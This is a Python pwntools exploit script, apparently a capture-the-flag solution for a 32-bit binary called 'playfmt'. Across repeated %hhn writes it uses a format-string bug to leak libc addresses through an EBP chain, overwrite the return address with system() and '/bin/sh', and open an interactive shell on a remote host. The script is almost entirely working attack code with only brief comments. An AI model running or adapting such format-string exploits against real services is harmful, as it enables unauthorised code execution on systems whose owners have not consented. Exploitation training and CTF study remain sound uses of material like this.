#!/usr/bin/env python
from pwn import *
import time

# EBP chain 
# %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
# 8048640.4.804857c.8048645.0.ff81e6d8.8048584.f7793ac0.0.ff81e6e8.80485b1.f77933c4.ff81e700.0.f7601af3.80485c0.0.0.

# ->    para 6 = EBP2
# ->    para 10 = EBP1
# -> 	para 14 = EBP0
# -> 	para 15 = __libc_start_main+243
#
# fmt at 0x804a060
# --> write add of fmt+0x10 to the return address 

playfmt = ELF('./playfmt')
lib     = ELF('./libc.so.6-32')

r = remote('192.168.31.25',33333)
#r = process('./playfmt')
#print r.proc.pid

r.readuntil('=====================\n')
r.readuntil('=====================\n')

# Step 1 : get the value of EBP and calculate the needvalue
r.send('%6$x.%10$x.%15$x\n')
res = r.recvline()
EBP2 = int( res.split('.')[0],16 )
EBP1 = int( res.split('.')[1],16 )
__libc_start_main = int( res.split('.')[2].split('\n')[0],16 ) - 243
libc_base_add = __libc_start_main - lib.symbols['__libc_start_main']
lib_sh_add = libc_base_add + list(lib.search('/bin/sh'))[0]
lib_sh = hex(lib_sh_add)
lib_system = libc_base_add + lib.symbols['system']
lib_system = hex(lib_system)
print 'EBP2 =',hex(EBP2)
print 'EBP1 =',hex(EBP1)
print 'lib_system =',lib_system
print 'lib_sh =',lib_sh

return_add = EBP1 
return_add = hex(return_add)[-2:]
nv = int(return_add,16)


# Step 2 : use EBP2 to make EBP1 point to the position of return_add
fmt = '%' + str(nv+20)+ 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

# Step 3 : use EBP1 to change return address
fmt = '%' + str( int(lib_system[-2:],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

# Step 4 : Repeat Step2 & Step3 
# 	   write system to return address 
#	   write add_sh to return address + 8
fmt = '%' + str( nv+21 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( int(lib_system[-4:-2],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( nv+22 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( int(lib_system[-6:-4],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( nv+23 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( int(lib_system[-8:-6],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( nv+28 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)
 
fmt = '%' + str( int(lib_sh[-2:],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( nv+29 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)
 
fmt = '%' + str( int(lib_sh[-4:-2],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( nv+30 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)
 
fmt = '%' + str( int(lib_sh[-6:-4],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)

fmt = '%' + str( nv+31 ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)
 
fmt = '%' + str( int(lib_sh[-8:-6],16) ) + 'c%10$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send :',fmt
time.sleep(2)


# trun back ebp to original value
fmt = '%' + str( nv ) + 'c%6$hhn'
r.send(fmt + '\n' )
res = r.recvline()
print 'send:',fmt
time.sleep(2)

# Step 5 : send quit
r.send('quit\n')


r.interactive()
